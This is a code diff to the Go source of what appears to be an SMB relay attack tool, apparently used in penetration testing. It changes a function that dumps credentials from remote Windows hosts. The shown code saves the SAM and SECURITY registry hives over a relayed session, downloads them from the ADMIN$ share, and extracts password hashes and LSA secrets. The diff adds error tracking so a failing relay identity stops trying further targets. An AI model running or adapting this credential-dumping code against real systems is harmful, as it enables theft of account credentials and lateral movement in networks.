@@ -95,14 +95,26 @@ func secretsdumpAttack(client *SMBRelayClient, cfg *Config) error {
 		return fmt.Errorf("open HKLM: %v", err)
 	}
 
+	// dumpErr collects the first failure so the attack returns an error and the
+	// caller (handleAuth) can stop this identity from trying more targets. A
+	// logged-but-swallowed failure previously kept the identity relaying.
+	var dumpErr error
+	noteErr := func(step string, err error) {
+		if err != nil && dumpErr == nil {
+			dumpErr = fmt.Errorf("%s: %v", step, err)
+		}
+	}
+
 	samTempFile, err := saveHiveViaRelay(rpcClient, hklm, "SAM")
 	if err != nil {
 		log.Printf("[-] Failed to save SAM hive: %v", err)
+		noteErr("save SAM hive", err)
 	}
 
 	secTempFile, err := saveHiveViaRelay(rpcClient, hklm, "SECURITY")
 	if err != nil {
 		log.Printf("[-] Failed to save SECURITY hive: %v", err)
+		noteErr("save SECURITY hive", err)
 	}
 
 	// Close winreg pipe and HKLM handle (done with registry ops)
@@ -119,14 +131,17 @@ func secretsdumpAttack(client *SMBRelayClient, cfg *Config) error {
 		samData, err := client.DownloadFile("ADMIN$", "Temp\\"+samTempFile)
 		if err != nil {
 			log.Printf("[-] Failed to download SAM hive: %v", err)
+			noteErr("download SAM hive", err)
 		} else {
 			samHive, err := registry.Open(samData)
 			if err != nil {
 				log.Printf("[-] Failed to parse SAM hive: %v", err)
+				noteErr("parse SAM hive", err)
 			} else {
 				users, err := registry.DumpSAM(samHive, bootKey)
 				if err != nil {
 					log.Printf("[-] Failed to dump SAM: %v", err)
+					noteErr("dump SAM", err)
 				} else {
 					for _, user := range users {
 						lmHash := hex.EncodeToString(user.LMHash)
@@ -145,10 +160,12 @@ func secretsdumpAttack(client *SMBRelayClient, cfg *Config) error {
 		secData, err := client.DownloadFile("ADMIN$", "Temp\\"+secTempFile)
 		if err != nil {
 			log.Printf("[-] Failed to download SECURITY hive: %v", err)
+			noteErr("download SECURITY hive", err)
 		} else {
 			secHive, err := registry.Open(secData)
 			if err != nil {
 				log.Printf("[-] Failed to parse SECURITY hive: %v", err)
+				noteErr("parse SECURITY hive", err)
 			} else {
 				domainInfo, _ := registry.GetDomainInfo(secHive)
 				dumpLSASecretsFromHive(secHive, bootKey, domainInfo)
@@ -160,7 +177,7 @@ func secretsdumpAttack(client *SMBRelayClient, cfg *Config) error {
 	// Step 6: Cleanup temp files
 	cleanupTempFiles(client, samTempFile, secTempFile)
 
-	return nil
+	return dumpErr
 }
 
 // getBootKeyViaRelay retrieves the boot key using the relay winreg connection
